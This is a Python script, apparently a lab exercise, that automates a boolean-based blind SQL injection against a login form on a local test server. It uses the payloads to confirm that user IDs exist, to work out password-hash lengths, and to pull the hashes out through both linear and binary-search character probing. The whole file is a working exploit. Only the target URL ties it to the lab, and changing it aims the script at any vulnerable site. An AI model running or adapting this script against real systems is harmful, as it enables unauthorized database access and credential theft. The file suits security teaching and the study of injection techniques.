#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Project #5: Exploiting a Restricted SQL Injection (Binary Search Optimization)
Author: Youssef Tamer Dabash (Dr. Dabash)
Description: Optimizing Boolean-Based Blind SQL Injection using Binary Search (O(log N))
             to cut HTTP query volume by ~50% (exact 4 queries per hex character).
"""

import requests

# عداد عام لحساب عدد الطلبات المرسلة للسيرفر في كل مرحلة
total_queries = 0

# سلة الحروف الممكنة في أي هاش (16 رمزاً مرتبة تصاعدياً من '0' إلى 'f')
charset = "0123456789abcdef"

# رابط السيرفر المحلي المصاب بالثغرة
target = "http://127.0.0.1:5000"

# الدليل النصي الذي يظهر في الصفحة فقط عندما يكون شرط SQL المحقون صحيحاً (True)
needle = "Welcome back"


def injected_query(payload):
    """
    ترسل الشرط المحقون داخل حقل username.
    بسبب وجود (not in):
    - ترجع False إذا ظهر الترحيب (أي أن شرط SQL كان صحيحاً True).
    - ترجع True إذا اختفى الترحيب (أي أن شرط SQL كان خاطئاً False).
    """
    global total_queries
    r = requests.post(
        target,
        data={"username": "admin' and {}--".format(payload), "password": "password"}
    )
    total_queries += 1
    return needle.encode() not in r.content


def boolean_query(offset, user_id, character, operator=">"):
    """
    تقارن الحرف رقم (offset + 1) من باسورد المستخدم بالحرف المختبر.
    بما أن الاستعلام يستخدم (>) ودالة injected_query تعكس النتيجة بـ (not in):
    - ترجع True إذا كان: الحرف_السري <= الحرف_المختبر
    - ترجع False إذا كان: الحرف_السري > الحرف_المختبر
    """
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(
        offset + 1, user_id, operator, character
    )
    return injected_query(payload)


def invalid_user(user_id):
    """تتحقق من وجود رقم المستخدم في جدول user (ترجع False لو المستخدم موجود فعلاً)."""
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)


def password_length(user_id):
    """تحسب طول الهاش بالتجربة التدريجية من 0 فصاعداً حتى ينجح الشرط."""
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(
            user_id, i
        )
        if not injected_query(payload):
            return i
        i += 1


def extract_hash(charset, user_id, password_length):
    """الطريقة العادية (Linear Search): تجرب حروف السلة بالترتيب من الأول للآخر."""
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found


def extract_hash_bst(charset, user_id, password_length):
    """الطريقة الذكية (Binary Search): تقسم سلة الحروف نصفين في كل سؤال (4 طلبات فقط لكل حرف)."""
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                middle = (start + end) // 2
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle
    return found


def total_queries_taken():
    """تطبع إجمالي عدد الطلبات المستهلكة ثم تصفّر العداد للعملية التالية."""
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0


if __name__ == "__main__":
    while True:
        try:
            user_id = input("> Enter a user ID to extract the password hash: ").strip()
            if not user_id:
                continue
            if not invalid_user(user_id):
                user_password_length = password_length(user_id)
                print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
                total_queries_taken()

                print("\t[-] User {} hash: {}".format(
                    user_id, extract_hash(charset, int(user_id), user_password_length)
                ))
                total_queries_taken()

                print("\t[-] User {} hash: {}".format(
                    user_id, extract_hash_bst(charset, int(user_id), user_password_length)
                ))
                total_queries_taken()
            else:
                print("\t[X] User {} does not exist!".format(user_id))
        except ValueError:
            print("\t[!] Please enter a valid numeric user ID.")
        except requests.RequestException as err:
            print("\t[!] Connection error ({}). Make sure the target lab server is running on {}.".format(err, target))
            break
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
